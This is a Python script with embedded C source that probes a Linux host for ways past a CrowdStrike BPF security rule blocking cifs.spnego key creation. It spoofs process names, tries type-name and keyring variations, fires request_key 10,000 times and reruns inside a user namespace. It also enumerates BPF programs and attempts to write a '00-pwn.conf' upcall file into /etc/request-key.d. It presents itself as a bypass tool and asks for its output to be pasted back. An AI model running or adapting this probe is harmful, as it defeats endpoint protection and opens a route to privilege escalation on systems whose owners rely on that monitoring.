#!/usr/bin/env python3
"""
CIFSwitch BPF bypass prober — security_key_alloc ONLY

Probes EXACTLY what CrowdStrike's BPF LSM blocks and allows.
On kernel 5.14, bpf_strncmp doesn't exist — CS uses manual comparison.
We test for bugs in that comparison and for gaps in the check.
"""
import ctypes, ctypes.util, errno, os, pwd, shlex, shutil, struct
import subprocess, sys, textwrap, time
from pathlib import Path

UID = os.getuid()
USER = pwd.getpwuid(UID).pw_name
RUN = "%d_%d" % (UID, os.getpid())
WD = Path("/tmp/bpf-%s" % RUN)

# ── Inline C probe ────────────────────────────────────────────────────────
PROBE_SRC = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/keyctl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#define NR_request_key  249
#define NR_add_key      248
#define NR_keyctl       250

static long try_request_key(const char *type, const char *desc, const char *callout, int dest) {
    errno = 0;
    long r = syscall(NR_request_key, type, desc, callout, dest);
    return r;
}

static long try_add_key(const char *type, const char *desc, const void *payload, size_t plen, int dest) {
    errno = 0;
    long r = syscall(NR_add_key, type, desc, payload, plen, dest);
    return r;
}

static void probe(const char *label, const char *type, int use_add_key) {
    long r;
    int e;
    char desc[256];
    snprintf(desc, sizeof(desc), "ver=0x2;host=x;ip4=127.0.0.1;sec=krb5;uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root", getpid());

    if (use_add_key) {
        r = try_add_key(type, desc, "x", 1, KEY_SPEC_SESSION_KEYRING);
        e = errno;
    } else {
        r = try_request_key(type, desc, "", KEY_SPEC_SESSION_KEYRING);
        e = errno;
    }

    const char *status;
    if (r >= 0) status = "OK!!!";
    else if (e == EPERM) status = "EPERM(blocked)";
    else if (e == ENOKEY) status = "ENOKEY";
    else if (e == ENODEV) status = "ENODEV(no-type)";
    else status = strerror(e);

    printf("%-45s %s=%ld  e=%d  %s\n", label, use_add_key?"ak":"rk", r, e, status);
    fflush(stdout);

    /* if key was created, log it and clean up */
    if (r >= 0) {
        printf("  *** KEY CREATED id=%ld type=%s ***\n", r, type);
        fflush(stdout);
        /* don't revoke — we want to use it! */
    }
}

static void probe_rk(const char *label, const char *type) { probe(label, type, 0); }
static void probe_ak(const char *label, const char *type) { probe(label, type, 1); }

int main(int ac, char **av) {
    int mode = (ac > 1) ? atoi(av[1]) : 0;

    printf("=== BPF PROBE pid=%d uid=%d mode=%d ===\n\n", getpid(), getuid(), mode);

    /* join fresh session keyring */
    syscall(NR_keyctl, KEYCTL_JOIN_SESSION_KEYRING, "probe", 0, 0, 0);

    /* ── Section 1: Basic type probing ──────────────────────────── */
    printf("--- 1. TYPE NAME PROBING (request_key) ---\n");
    probe_rk("cifs.spnego (standard)",        "cifs.spnego");
    probe_rk("cifs.idmap (allowed?)",          "cifs.idmap");
    probe_rk("dns_resolver (allowed?)",        "dns_resolver");
    probe_rk("user (allowed?)",                "user");
    probe_rk("keyring (internal)",             "keyring");
    probe_rk("logon (restricted)",             "logon");
    probe_rk("big_key",                        "big_key");
    probe_rk("asymmetric",                     "asymmetric");

    printf("\n--- 2. TYPE NAME PROBING (add_key) ---\n");
    probe_ak("cifs.spnego (standard)",         "cifs.spnego");
    probe_ak("cifs.idmap",                     "cifs.idmap");
    probe_ak("dns_resolver",                   "dns_resolver");
    probe_ak("user (allowed?)",                "user");

    /* ── Section 3: String comparison bugs ─────────────────────── */
    printf("\n--- 3. STRING COMPARISON PROBING ---\n");
    printf("Testing if CS has bugs in type name comparison...\n");

    /* Case variations */
    probe_rk("CIFS.SPNEGO (uppercase)",        "CIFS.SPNEGO");
    probe_rk("Cifs.Spnego (mixed)",            "Cifs.Spnego");
    probe_rk("cifs.SPNEGO (partial upper)",    "cifs.SPNEGO");

    /* Prefix/suffix */
    probe_rk("cifs.spneg (truncated -1)",      "cifs.spneg");
    probe_rk("cifs.spne (truncated -2)",       "cifs.spne");
    probe_rk("cifs.spn (truncated -3)",        "cifs.spn");
    probe_rk("cifs.sp (truncated -4)",         "cifs.sp");
    probe_rk("cifs. (just prefix)",            "cifs.");
    probe_rk("cifs (no dot)",                  "cifs");

    /* Close matches */
    probe_rk("cifs.spnegp (off-by-one last)",  "cifs.spnegp");
    probe_rk("cifs.spnego2 (extra char)",       "cifs.spnego2");
    probe_rk("cifs.spnegos (extra s)",          "cifs.spnegos");
    probe_rk("cifs_spnego (underscore)",        "cifs_spnego");
    probe_rk("cifs-spnego (dash)",              "cifs-spnego");

    /* Null byte tricks - probably won't work but test */
    /* These would need raw bytes — type is a C string so null terminates */

    /* ── Section 4: Flag & keyring variations ──────────────────── */
    printf("\n--- 4. KEYRING VARIATIONS ---\n");
    {
        long r; int e;
        char desc[256];
        snprintf(desc, sizeof(desc), "ver=0x2;host=x;ip4=127.0.0.1;sec=krb5;uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root", getpid());

        int keyrings[] = {
            KEY_SPEC_THREAD_KEYRING,   /* -1 */
            KEY_SPEC_PROCESS_KEYRING,  /* -2 */
            KEY_SPEC_SESSION_KEYRING,  /* -3 */
            KEY_SPEC_USER_KEYRING,     /* -4 */
            KEY_SPEC_USER_SESSION_KEYRING, /* -5 */
            0 /* null/default */
        };
        const char *kr_names[] = {"thread","process","session","user","user_session","zero"};

        for (int i = 0; i < 6; i++) {
            errno = 0;
            r = syscall(NR_request_key, "cifs.spnego", desc, "", keyrings[i]);
            e = errno;
            printf("  keyring=%-15s rk=%ld e=%d %s\n", kr_names[i], r, e,
                   r>=0?"***OK***":(e==EPERM?"BLOCKED":strerror(e)));
        }
    }

    /* ── Section 5: Process name/comm spoofing ─────────────────── */
    printf("\n--- 5. PROCESS NAME SPOOFING ---\n");
    {
        const char *names[] = {"mount.cifs","cifs.upcall","request-key","systemd","kworker/0:0",NULL};
        char desc[256];
        snprintf(desc, sizeof(desc), "ver=0x2;host=x;ip4=127.0.0.1;sec=krb5;uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root", getpid());

        for (int i = 0; names[i]; i++) {
            prctl(PR_SET_NAME, names[i], 0, 0, 0);
            errno = 0;
            long r = syscall(NR_request_key, "cifs.spnego", desc, "", KEY_SPEC_SESSION_KEYRING);
            int e = errno;
            printf("  comm=%-20s rk=%ld e=%d %s\n", names[i], r, e,
                   r>=0?"***OK***":(e==EPERM?"BLOCKED":strerror(e)));
        }
        prctl(PR_SET_NAME, "probe", 0, 0, 0);
    }

    /* ── Section 6: Description variations ─────────────────────── */
    printf("\n--- 6. DESCRIPTION VARIATIONS ---\n");
    {
        const char *descs[] = {
            "",
            "x",
            "*",
            "ver=0x2;host=x",
            "ver=0x2;host=x;ip4=127.0.0.1;sec=krb5",
            NULL
        };
        for (int i = 0; descs[i]; i++) {
            errno = 0;
            long r = syscall(NR_request_key, "cifs.spnego", descs[i], "", KEY_SPEC_SESSION_KEYRING);
            int e = errno;
            printf("  desc=%-40s rk=%ld e=%d %s\n",
                   descs[i][0]?descs[i]:"(empty)", r, e,
                   r>=0?"***OK***":(e==EPERM?"BLOCKED":strerror(e)));
        }
    }

    /* ── Section 7: Callout variations ─────────────────────────── */
    printf("\n--- 7. CALLOUT VARIATIONS ---\n");
    {
        char desc[256];
        snprintf(desc, sizeof(desc), "ver=0x2;host=x;ip4=127.0.0.1;sec=krb5;uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root", getpid());

        /* NULL callout = search only, no creation */
        errno = 0;
        long r = syscall(NR_request_key, "cifs.spnego", desc, (void*)0, KEY_SPEC_SESSION_KEYRING);
        int e = errno;
        printf("  callout=NULL             rk=%ld e=%d %s\n", r, e,
               r>=0?"***OK***":(e==EPERM?"BLOCKED":strerror(e)));

        /* Empty string callout */
        errno = 0;
        r = syscall(NR_request_key, "cifs.spnego", desc, "", KEY_SPEC_SESSION_KEYRING);
        e = errno;
        printf("  callout=\"\"             rk=%ld e=%d %s\n", r, e,
               r>=0?"***OK***":(e==EPERM?"BLOCKED":strerror(e)));

        /* With actual callout data */
        errno = 0;
        r = syscall(NR_request_key, "cifs.spnego", desc, "NEGOTIATE", KEY_SPEC_SESSION_KEYRING);
        e = errno;
        printf("  callout=NEGOTIATE        rk=%ld e=%d %s\n", r, e,
               r>=0?"***OK***":(e==EPERM?"BLOCKED":strerror(e)));
    }

    /* ── Section 8: Dumpable flag ──────────────────────────────── */
    printf("\n--- 8. DUMPABLE FLAG ---\n");
    {
        char desc[256];
        snprintf(desc, sizeof(desc), "ver=0x2;host=x;ip4=127.0.0.1;sec=krb5;uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root", getpid());

        prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
        errno = 0;
        long r = syscall(NR_request_key, "cifs.spnego", desc, "", KEY_SPEC_SESSION_KEYRING);
        int e = errno;
        printf("  dumpable=0  rk=%ld e=%d %s\n", r, e,
               r>=0?"***OK***":(e==EPERM?"BLOCKED":strerror(e)));
        prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
    }

    /* ── Section 9: Rapid fire burst ──────────────────────────── */
    if (mode >= 1) {
        printf("\n--- 9. RAPID FIRE (10000 attempts) ---\n");
        char desc[256];
        snprintf(desc, sizeof(desc), "ver=0x2;host=x;ip4=127.0.0.1;sec=krb5;uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root", getpid());
        int ok = 0, eperm = 0, other = 0;
        for (int i = 0; i < 10000; i++) {
            errno = 0;
            long r = syscall(NR_request_key, "cifs.spnego", desc, "", KEY_SPEC_SESSION_KEYRING);
            if (r >= 0) { ok++; printf("  *** BURST HIT at i=%d id=%ld ***\n", i, r); break; }
            else if (errno == EPERM) eperm++;
            else other++;
        }
        printf("  burst: ok=%d eperm=%d other=%d\n", ok, eperm, other);
    }

    /* ── Section 10: BPF filesystem check ─────────────────────── */
    printf("\n--- 10. BPF FILESYSTEM ---\n");
    {
        struct stat st;
        if (stat("/sys/fs/bpf", &st) == 0) {
            printf("  /sys/fs/bpf exists mode=%o uid=%d gid=%d\n", st.st_mode & 0777, st.st_uid, st.st_gid);

            /* Try to list contents */
            system("ls -la /sys/fs/bpf/ 2>&1 | head -20");
            system("find /sys/fs/bpf/ -maxdepth 3 2>/dev/null | head -30");

            /* Check for writable entries */
            system("find /sys/fs/bpf/ -writable 2>/dev/null | head -10");
        } else {
            printf("  /sys/fs/bpf not mounted\n");
        }
    }

    /* ── Section 11: BPF program enumeration ──────────────────── */
    printf("\n--- 11. BPF PROGRAM ENUMERATION ---\n");
    {
        /* Try bpf(BPF_PROG_GET_NEXT_ID) — might work without CAP_BPF on some configs */
        unsigned int id = 0;
        struct { unsigned int start_id; unsigned int next_id; unsigned int open_flags; } attr = {0,0,0};
        int count = 0;

        for (int i = 0; i < 200; i++) {
            attr.start_id = id;
            errno = 0;
            long r = syscall(321 /* __NR_bpf */, 11 /* BPF_PROG_GET_NEXT_ID */, &attr, sizeof(attr));
            if (r < 0) break;
            id = attr.next_id;
            count++;
        }
        if (count > 0) {
            printf("  Found %d BPF programs (first readable!)\n", count);
            printf("  *** BPF enumeration works — can analyze CS programs! ***\n");
        } else {
            printf("  BPF enumeration blocked (errno=%d %s)\n", errno, strerror(errno));
        }
    }

    /* ── Section 12: /proc/sys/kernel/keys check ──────────────── */
    printf("\n--- 12. KERNEL KEY PARAMS ---\n");
    system("cat /proc/sys/kernel/keys/* 2>/dev/null | paste - - - - | head -5");
    system("ls -la /proc/sys/kernel/keys/ 2>/dev/null");

    /* ── Section 13: Check if vet_description exists ──────────── */
    printf("\n--- 13. VET_DESCRIPTION CHECK ---\n");
    printf("NULL callout (search only): ");
    {
        errno = 0;
        long r = syscall(NR_request_key, "cifs.spnego", "test", (void*)0, KEY_SPEC_SESSION_KEYRING);
        int e = errno;
        printf("rk=%ld e=%d %s\n", r, e, strerror(e));
        if (e == EPERM) {
            printf("  vet_description LIKELY PRESENT (blocks even search)\n");
            printf("  Need kernel-level bypass, not just BPF\n");
        } else if (e == ENOKEY) {
            printf("  vet_description ABSENT — block is from BPF at key_alloc\n");
            printf("  BPF bypass is the right target\n");
        }
    }

    /* ── Section 14: cifs module info ──────────────────────────── */
    printf("\n--- 14. CIFS MODULE ---\n");
    system("grep cifs /proc/filesystems 2>/dev/null");
    system("cat /sys/module/cifs/parameters/* 2>/dev/null | head -10");
    system("ls /sys/module/cifs/parameters/ 2>/dev/null");
    system("modinfo cifs 2>/dev/null | head -5");

    /* ── Section 15: From user namespace ───────────────────────── */
    if (mode >= 2) {
        printf("\n--- 15. FROM INSIDE USER NAMESPACE ---\n");
        printf("(re-running key probe from inside unshare -Ur)\n");
        fflush(stdout);
        /* This re-execs ourselves inside a user namespace */
        if (fork() == 0) {
            execlp("unshare", "unshare", "-Ur", av[0], "0", NULL);
            perror("execlp");
            _exit(1);
        }
        int status; wait(&status);
    }

    printf("\n=== PROBE COMPLETE ===\n");
    printf("Look for any line with '***OK***' — that's a bypass.\n");
    printf("Look at Section 13 to determine if block is BPF or vet_description.\n");
    return 0;
}
'''

def main():
    shutil.rmtree(str(WD), ignore_errors=True)
    WD.mkdir(parents=True)

    src = WD / "probe.c"
    src.write_text(PROBE_SRC)
    exe = WD / "probe"

    print("[*] Building probe...", flush=True)
    r = os.system("gcc -Wall -o %s %s 2>&1" % (exe, src))
    if r != 0:
        print("Build failed", flush=True)
        sys.exit(1)

    print("[*] Running probe (mode=2 = all tests + userns + burst)...\n", flush=True)
    os.system("%s 2" % exe)

    print("\n[*] Also checking request-key.d and BPF from Python:", flush=True)

    # Check /etc/request-key.d/ permissions
    for p in ["/etc/request-key.d", "/etc/request-key.conf",
              "/sys/fs/bpf", "/sys/fs/bpf/crowdstrike",
              "/sys/fs/bpf/falcon", "/sys/fs/bpf/cs"]:
        try:
            st = os.stat(p)
            w = os.access(p, os.W_OK)
            print("  %s: mode=%o uid=%d writable=%s" % (p, st.st_mode & 0o7777, st.st_uid, w), flush=True)
            if w:
                print("  *** WRITABLE: %s ***" % p, flush=True)
        except:
            print("  %s: not found" % p, flush=True)

    # Try to actually write to request-key.d
    for p in ["/etc/request-key.d/00-pwn.conf", "/etc/request-key.d/cifs.spnego.conf"]:
        try:
            with open(p, "w") as f:
                f.write("create cifs.spnego * * /usr/sbin/cifs.upcall %k\n")
            print("  *** WROTE %s ***" % p, flush=True)
        except Exception as e:
            print("  write %s: %s" % (p, e), flush=True)

    # Check for BPF tools
    for tool in ["bpftool", "/usr/sbin/bpftool", "/sbin/bpftool"]:
        if shutil.which(tool) or os.path.exists(tool):
            print("\n  bpftool found: %s" % tool, flush=True)
            os.system("%s prog list 2>&1 | head -30" % tool)
            os.system("%s prog list 2>&1 | grep -i -E 'lsm|security|key|cifs|falcon|cs' | head -10" % tool)
            break

    print("\n=== DONE ===", flush=True)
    print("Paste the ENTIRE output.", flush=True)


if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(130)
